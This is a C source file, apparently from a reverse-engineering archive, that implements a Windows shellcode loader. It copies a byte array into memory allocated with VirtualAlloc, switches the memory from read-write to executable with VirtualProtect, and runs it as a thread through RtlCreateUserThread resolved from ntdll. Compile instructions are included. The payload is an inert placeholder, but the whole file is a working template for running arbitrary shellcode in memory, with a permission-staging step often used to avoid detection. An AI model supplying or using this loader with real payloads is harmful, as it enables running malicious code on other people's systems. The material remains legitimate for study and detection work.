/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new thread.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - permission: VirtualProtect
    - execution:  RtlCreateUserThread
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)
#define GetCurrentProcess()  ((HANDLE)(LONG_PTR) -1)

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI RtlCreateUserThread_t (
    HANDLE      ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN     CreateSuspended,
    ULONG       StackZeroBits, 
    PULONG      StackReserved,
    PULONG      StackCommit,
    PVOID       StartAddress,
    PVOID       StartParameter,
    PHANDLE     ThreadHandle,
    PCLIENT_ID  ClientID
);
typedef RtlCreateUserThread_t FAR * pRtlCreateUserThread;


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread = NULL;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     ntdll;

    // function pointer to internal API
    pRtlCreateUserThread RtlCreateUserThread;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    RtlCreateUserThread  = (pRtlCreateUserThread) GetProcAddress(ntdll, "RtlCreateUserThread");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        RtlCreateUserThread (GetCurrentProcess(), NULL, FALSE, 0, NULL, NULL, (LPTHREAD_START_ROUTINE) runtime, NULL, &h_thread, NULL);
        WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}